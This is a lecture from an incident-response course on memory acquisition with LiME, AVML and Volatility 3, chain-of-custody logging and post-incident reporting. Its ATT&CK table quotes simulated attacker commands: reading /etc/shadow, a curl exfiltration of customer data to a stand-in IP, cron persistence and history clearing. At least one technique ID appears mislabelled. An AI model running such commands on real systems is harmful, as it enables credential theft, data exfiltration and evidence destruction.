# Lecture 3 — Memory Acquisition, Chain of Custody, and the Post-Incident Report

> *Lecture 2 left the analyst with a working timeline. The question this lecture answers is: what artefact do you acquire, in what order, with what discipline, and how do you turn the timeline into the report that closes the incident. The audience is the same analyst, still on the same incident, now an hour or two in, beginning to think about evidence preservation and post-incident artefacts.*

---

## 1. Order of volatility (RFC 3227)

RFC 3227, *Guidelines for Evidence Collection and Archiving*, was published in 2002 and is still the canonical reference. It is short — a single web page at <https://datatracker.ietf.org/doc/html/rfc3227> — and § 2.1 lists the order in which evidence should be collected, from most volatile to least:

1. Registers, cache.
2. Routing table, ARP cache, process table, kernel statistics, memory.
3. Temporary file systems.
4. Disk.
5. Remote logging and monitoring data.
6. Physical configuration, network topology.
7. Archival media.

The first item is essentially uncollectable from a running system in 2026 (CPU caches change every nanosecond; you cannot freeze them without specialised JTAG hardware). The second item is what we *can* collect: live memory and the volatile state it contains. The remainder are progressively easier and progressively less time-sensitive.

The operational rule the RFC implies, and the rule that every IR runbook codifies: **acquire memory before disk; acquire disk before reading log archives; acquire log archives before reconstructing topology**. The reason is simple: any acquisition step alters the system. Reading a file updates atime (in some filesystems). Running `ps` consumes memory pages. Each step costs a small amount of evidence; the order minimises the cost.

In a corporate environment with mature tooling, memory acquisition is often automated (the EDR agent snapshots memory when the analyst clicks a button). In a small environment, it is a runbook step. The runbook is what this lecture walks.

---

## 2. The decision to acquire memory

Memory acquisition is not free. The cost is operational and legal both:

- **Operational.** A memory acquisition stops the system from doing useful work for the duration (LiME freezes the kernel for the duration of the dump; AVML is less invasive but still consumes CPU and I/O). The dump file is large — on a 16 GB host, the dump is 16 GB, plus a small overhead. Storage and bandwidth to move the dump to the analysis environment are not negligible.
- **Legal.** Memory contains everything: keys, passwords, decrypted documents, the contents of every process. Acquiring memory acquires every secret on the host. The authorisation reference for the acquisition must be specific to memory; "permission to investigate" is not specific enough in many legal frames.

The cost-benefit equation: acquire memory when the investigation will benefit from running-process state that has not been written to disk (recently-cleared shell history, in-memory C2 payloads that never touched disk, decrypted-document content that the user opened but did not save). Skip memory acquisition when the investigation is purely a log-based after-action review with no expectation of live malware on the host.

The lab requires memory acquisition. The starter directory ships a *simulated* memory snippet (a small text file containing the strings that would appear in a Volatility 3 `linux.bash` plugin output); the optional live-host portion of the mini-project walks the real LiME or AVML acquisition on your own VM.

---

## 3. LiME — the Linux Memory Extractor

LiME has been the de-facto standard Linux memory-acquisition tool since 2011. It is a kernel module; building it requires the headers for the target host's kernel.

### 3.1 Building LiME against a kernel

```bash
# On the target host, install the kernel headers.
sudo apt install linux-headers-$(uname -r) build-essential

# Clone the source.
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src

# Build the module against the running kernel.
make

# Result is lime-<kernel-version>.ko in the current directory.
ls *.ko
```

The pitfall: in an incident response, the responder often does not have the headers, does not have the toolchain, and does not have the time to install them on the affected host. The mature workaround: pre-build LiME modules for every kernel version in the environment as part of *preparation*; store them on a USB stick (the "jump kit"); copy onto the affected host at acquisition time.

### 3.2 Running LiME

```bash
# Load the module; the parameters tell LiME where to write and in what format.
sudo insmod ./lime-$(uname -r).ko \
  "path=/tmp/memory.lime format=lime"

# The dump is now at /tmp/memory.lime.
ls -la /tmp/memory.lime

# Hash the dump immediately (chain of custody).
sha256sum /tmp/memory.lime > /tmp/memory.lime.sha256

# Unload the module.
sudo rmmod lime
```

Three formats: `raw` (a flat dump of physical memory), `padded` (the same with zero-padding for holes), and `lime` (LiME's own format, which annotates each region with its physical address and is the most useful for Volatility 3). Use `lime`.

The dump file should ideally be written to a remote target (`path=tcp:4444`) so that the acquisition does not consume the affected host's local disk; in a small environment, the local-disk acquisition followed by an `scp` to the analysis host is acceptable as long as the disk write itself does not displace evidence (use a USB drive or a network share rather than the host's `/`).

### 3.3 Hashing immediately

The instant the dump file's last byte is written, the analyst computes the SHA-256 and the MD5 and records both in the chain-of-custody log. Doing so any later admits the possibility that the file was modified between acquisition and hashing; the chain-of-custody discipline does not survive admitting that possibility.

---

## 4. AVML — the simpler path

AVML (Acquire Volatile Memory for Linux) is Microsoft's open-source userspace alternative to LiME. It does not require building a kernel module. It is a single static binary. Released 2020; MIT-licensed; canonical in 2026.

### 4.1 Installing AVML

```bash
# Pre-built binaries are at https://github.com/microsoft/avml/releases.
# Pick the static-musl binary that matches the host's architecture.
curl -L -o avml \
  https://github.com/microsoft/avml/releases/latest/download/avml
chmod +x avml
```

In the IR jump kit, AVML lives alongside LiME. Use whichever the responder's runbook prefers; AVML is the simpler choice when the responder has no build infrastructure that matches the target kernel.

### 4.2 Running AVML

```bash
# Acquire memory. Output is a LiME-format file by default.
sudo ./avml /tmp/memory.lime

# Hash immediately.
sha256sum /tmp/memory.lime > /tmp/memory.lime.sha256

# Optionally upload directly to Azure Blob, AWS S3, or a presigned URL
# (AVML supports each via CLI flags).
sudo ./avml --url 'https://...presigned...' /tmp/memory.lime
```

AVML reads `/proc/kcore` (the canonical Linux mechanism for live memory) and packages the output in LiME's file format so that Volatility 3 can ingest it without modification. The acquisition takes roughly 30 seconds per GB on modern hardware; the host remains usable throughout.

---

## 5. Analysing the dump with Volatility 3

Volatility 3 is the canonical free memory-analysis framework. The Python 3 rewrite of the original Volatility (which was Python 2), maintained at <https://github.com/volatilityfoundation/volatility3>.

### 5.1 The minimal triage

```bash
# Install (it is on PyPI).
pip install volatility3

# List processes (running at acquisition time).
vol -f /tmp/memory.lime linux.pslist

# Process tree.
vol -f /tmp/memory.lime linux.pstree

# Open files (the lsof equivalent).
vol -f /tmp/memory.lime linux.lsof

# Network state (the netstat equivalent).
vol -f /tmp/memory.lime linux.netstat

# Reconstruct bash history from process heap.
# THIS is the plugin most often run in IR — it recovers the history
# even if ~/.bash_history was cleared.
vol -f /tmp/memory.lime linux.bash

# Suspicious memory regions (executable + writable + private).
vol -f /tmp/memory.lime linux.malfind
```

`linux.bash` is the single most-cited Volatility 3 plugin for IR. It walks each shell process's heap, finds the readline history buffer, and prints every command the user typed in that shell — including commands typed *after* the file on disk was cleared. The lab's mini-project includes a small recovered-history snippet for this reason.

### 5.2 Symbol tables (the operational gotcha)

Volatility 3 needs a *symbol table* for the running kernel of the acquired host. For common distributions, the symbol tables are pre-published in the `volatility3` symbol-table repository at <https://github.com/Abyss-W4tcher/volatility3-symbols>. For an uncommon distribution or a custom kernel, the responder must generate the symbol table themselves using the `dwarf2json` tool from the same project.

In the lab the symbol table is bundled with the starter directory because the simulated memory snippet is from a generic Ubuntu 24.04 kernel. In a real engagement, the symbol-table requirement is the single biggest cause of "I acquired memory and now I cannot read it"; the mature defence is to pre-generate symbol tables for every kernel in the environment as part of preparation.

---

## 6. Chain of custody

The chain-of-custody log is the document that turns an artefact into evidence. The log answers, for any artefact at any moment, who held it, when, what state it was in, and how to verify the state. If the log is broken — if there is a gap, an unsigned transfer, an unverified hash — the artefact's evidentiary value collapses.

### 6.1 The required fields

For every artefact:

- **Artefact name.** A stable identifier; the SHA-256 itself works.
- **Artefact type.** Memory dump, disk image, log file, configuration file.
- **Acquisition timestamp.** ISO 8601 UTC.
- **Acquiring operator.** A real human; "the IR team" is not specific enough.
- **System identifier.** Hostname plus an unforgeable identifier: the host's `machine-id` (`/etc/machine-id`, populated by `systemd-machine-id-setup`), the host's serial number, or the inventory ID.
- **Tool name and version.** "LiME 1.9.1" or "AVML 0.13.0".
- **Authorisation reference.** Engagement letter ID, ticket ID, statutory authority. Without this, the rest of the log is decoration.
- **SHA-256.** Always.
- **MD5.** For legacy-tool compatibility; SHA-256 is the canonical integrity check.

For every transfer:

- **From.** Operator who held the artefact before.
- **To.** Operator who holds it after.
- **Timestamp.** ISO 8601 UTC.
- **Re-verified SHA-256.** The receiving operator computes the hash on receipt and confirms it matches the prior log entry. If it does not match, the transfer is voided and the artefact's provenance is flagged.

### 6.2 The template

The mini-project starter directory includes `CUSTODY_LOG_TEMPLATE.md`. The shape is YAML-frontmatter Markdown, easy to commit to Git, easy for a human to read. A populated entry:

```markdown
---
artefact: memory.lime
type: memory-dump
acquired_at: 2026-05-14T03:21:44Z
acquired_by: jstephane
system_id: web-prod-02 (machine-id=8c5d3a...)
tool: AVML 0.13.0
authorisation: incident IR-2026-014, ticket #4421
sha256: 6f7c8b9e1a... (full 64-character hash)
md5: 1a2b3c4d5e6f... (32-character hash; legacy)
---

# Memory acquisition — web-prod-02 — 2026-05-14T03:21:44Z

Acquired from web-prod-02 via AVML 0.13.0 immediately after network isolation
(see incident log entry IR-2026-014 at 02:52:33Z). Acquisition wrote to
/tmp/memory.lime on the host, then transferred via scp to the IR analysis
host at 03:25:11Z (transfer entry below).

## Transfers

| From       | To       | At                    | Verified SHA-256 |
|------------|----------|-----------------------|------------------|
| host:web-prod-02 | host:ir-analysis-01 | 2026-05-14T03:25:42Z | match |
| jstephane  | lopez    | 2026-05-14T04:11:09Z  | match |
| lopez      | huang    | 2026-05-14T16:30:00Z  | match (Volatility analysis complete) |
```

Every artefact gets a file. The custody-log directory is committed to Git in the IR repository (or to an equivalent immutable store). The commits are signed where the team supports signed commits; at minimum the commit author identity is known.

### 6.3 Python automation

`exercises/exercise-04-custody-log.py` generates and verifies a chain-of-custody log for a directory of artefacts. The script computes SHA-256 and MD5 for every file, writes the custody log, and on subsequent runs verifies that every artefact still matches its recorded hash. The implementation is small (under 200 lines) and is the basis for the script you will run in the mini-project.

---

## 7. The MITRE ATT&CK mapping

The mini-project's deliverable includes an ATT&CK map. The map is a table; each row is one observed event, and each row carries at least one technique ID with a pointer to the evidence (log line, artefact, hash).

A snippet for the lab:

| Time (ISO 8601 UTC) | Observed event | ATT&CK | Evidence |
|---|---|---|---|
| 2026-05-14T02:46:36Z | `GET /.git/HEAD 200` from 198.51.100.7 | T1190 Exploit Public-Facing Application (information disclosure leading to code access) | `nginx access.log` line 4421 |
| 2026-05-14T02:47:11Z | SSH publickey accepted for user `deploy` from 198.51.100.7 | T1078 Valid Accounts | `auth.log` line 14 |
| 2026-05-14T02:47:32Z | `sudo` to root by user `deploy` | T1548.003 Sudo and Sudo Caching | `auth.log` line 18 |
| 2026-05-14T02:47:35Z | `/tmp/x` executed; new file at `/tmp/.x` size 4.2 MB | T1059.004 Unix Shell | bash_history line 4; `find -newer` artefact |
| 2026-05-14T02:48:02Z | New user `support` created with UID 1099 | T1136.001 Local Account | `auth.log` line 22 |
| 2026-05-14T02:48:33Z | `cron` entry added: `*/5 * * * * /tmp/.x` | T1543.003 Systemd Service (analogue) and T1053.003 Cron | `/var/spool/cron/crontabs/support` |
| 2026-05-14T02:49:01Z | `chattr +i /tmp/.x` (immutable bit set) | T1564.004 NTFS File Attributes (Linux analogue) | shell history |
| 2026-05-14T02:49:15Z | `cat /etc/shadow > /tmp/sh.out` | T1003.008 /etc/passwd and /etc/shadow | shell history |
| 2026-05-14T02:49:22Z | `tar czf /tmp/d.tar.gz /home/customers/` | T1005 Data from Local System; T1560.001 Archive via Utility | bash history; `find` of `/tmp` |
| 2026-05-14T02:49:40Z | `curl -X POST --data-binary @/tmp/d.tar.gz https://198.51.100.7:8443/` | T1041 Exfiltration Over C2 Channel | bash history; nginx egress proxy log; firewall log |
| 2026-05-14T02:50:05Z | `history -c` and `rm ~/.bash_history` | T1070.003 Clear Command History | bash_history file empty on disk; Volatility recovers; gap in history file |

The mapping is laborious; the laboriousness is the point. The map is the lingua franca for sharing the incident with peer organisations and government partners. Every row is defensible.

The mini-project ships a partial map (the obvious entries) and asks you to complete it from the artefact set.

---

## 8. The post-incident report

The report is the durable artefact of the response. The template lives at `mini-project/starter/REPORT_TEMPLATE.md` and is structured as below. Every section is required; the template's placeholder text lists what each section must contain.

### 8.1 Executive summary (200 words, non-technical)

Five questions answered in plain language: what happened, when, what we did, what is the impact, what is the status. Many executives read no further; the summary is the report from their perspective. Write the summary last (after you know the answers), but place it first.

### 8.2 Incident timeline (chronological, ISO 8601 UTC)

The full ordered event list, source-labelled. The output of `exercises/exercise-03-timeline-builder.py`. This is the spine of the report.

### 8.3 Indicators of compromise (IOCs)

A list of IOCs in three categories: network (IPs, domains, URLs), host (file paths, hashes, registry keys for Windows, configuration files for Linux), and behaviour (the distinctive command sequences, the specific compression-then-curl pattern). Each IOC has a first-seen and a last-seen timestamp, a confidence level, and a sharing classification (TLP:WHITE share freely, TLP:GREEN share with peer community, TLP:AMBER share with the affected organisation only, TLP:RED do not share).

### 8.4 MITRE ATT&CK mapping

The table from § 7 above, completed.

### 8.5 Root-cause analysis

Three layers:

- **Proximate cause.** The specific action that triggered the incident (a stolen credential, a vulnerable endpoint, a misconfigured permission). One paragraph.
- **Contributing causes.** The conditions that allowed the proximate cause to result in the observed impact (MFA not enforced, log monitoring not configured, the affected host had network egress it did not need). One paragraph per cause.
- **Systemic cause.** The process or organisational issue that allowed the contributing causes to exist (no quarterly access review, no documented network-egress policy, no IR runbook for the affected service). One paragraph.

The systemic-cause analysis is the most useful for preparation-phase improvements. It is also the most uncomfortable to write because it usually identifies organisational gaps that the people writing the report cannot fix alone. Write it anyway.

### 8.6 Containment, eradication, recovery narrative

The story of what the team did, in chronological order, with the rationale for each major decision. This is the section other responders will read when a similar alert fires next year; write it as if you were writing the next responder's training material.

### 8.7 Lessons learned

The output of the lessons-learned meeting (Lecture 1 § 5.1). Specific action items, each with an owner and a due date. Short. Honest.

### 8.8 Appendices

The raw artefacts, the custody-log directory, the chain of all commands run during the response, the SIEM queries used. The appendices are the substance the body summarises.

---

## 9. Regulatory disclosure

The legal team owns the disclosure decision. The IR team supplies the facts. The questions whose answers drive disclosure are essentially factual:

- Was personal data involved? (GDPR, US state breach laws, HIPAA, sector-specific rules.)
- Was payment-card data involved? (PCI-DSS § 12.10.5; brand-specific rules.)
- Was protected health information involved? (HIPAA breach-notification rule.)
- Was material non-public information involved? (US securities law; equivalent rules elsewhere.)
- Did the incident affect a critical national infrastructure operator? (NIS2 in the EU; CISA's reporting obligations under CIRCIA in the US, when CIRCIA's rule becomes effective.)
- Did the incident cause downtime exceeding a regulator-specified threshold? (Several sector regulators.)

The IR report must be able to answer each question definitively from the timeline and the artefact inventory. *Cannot determine* is acceptable if documented; *did not look* is not.

The mini-project does not require regulatory disclosure (the incident is simulated). The report template includes a "Regulatory considerations" section that walks the questions; you answer them based on the simulated facts.

---

## 10. Sharing IOCs

The mature behaviour is to share. Channels include:

- **Sector ISACs.** The information sharing and analysis centres for financial services (FS-ISAC), healthcare (H-ISAC), retail and hospitality (RH-ISAC), and other sectors. Membership is paid; the sharing inside the ISAC is the value.
- **CISA AIS.** The US Cybersecurity and Infrastructure Security Agency's Automated Indicator Sharing program. Free.
- **MISP.** Open-source threat-intel-sharing platform. Self-hosted or community-hosted instances. The most common technical channel for community sharing in 2026.
- **STIX/TAXII.** The standard format (STIX) and transport (TAXII) for machine-readable threat intel. The mini-project's IOC export is in a STIX-flavoured JSON shape.

The mini-project ships `IOCs_TEMPLATE.json` with placeholder STIX fields; the exercise is to populate it from the timeline.

---

## 11. The lessons-learned meeting (Lecture 1's § 5.1 revisited)

The meeting closes the loop. Held within two weeks of incident closure. Agenda is fixed; the format is *blameless*. The five questions:

1. Read the timeline aloud. Corrections become updates.
2. What worked. Becomes positive entries in the runbook.
3. What did not work. Becomes engineering tickets, runbook updates, training items.
4. What we did not know. Becomes preparation-phase action items.
5. Action items. Each has an owner and a due date.

The output is committed to the IR repository alongside the report. The actions get tracked to completion. The next incident that fires uses the improved runbook. That is the loop.

---

## 12. What to do this week

The exercises and the mini-project operationalise everything in these three lectures. The recommended sequence:

1. Read `resources.md` to identify which primary sources you will lean on most.
2. Work the exercises in order (E1 first-30-minutes; E2 log triage; E3 timeline builder; E4 chain-of-custody log).
3. Take the quiz.
4. Run the mini-project: triage the lab artefacts, build the timeline, complete the ATT&CK map, write the report, ship the IOC export, commit the chain-of-custody log.
5. Take the homework problems.
6. Push.

The expected total time is roughly 35 hours, distributed per the README's schedule.

---

*Back to [README](../README.md). Forward to [exercises/](../exercises/) and [mini-project/](../mini-project/).*
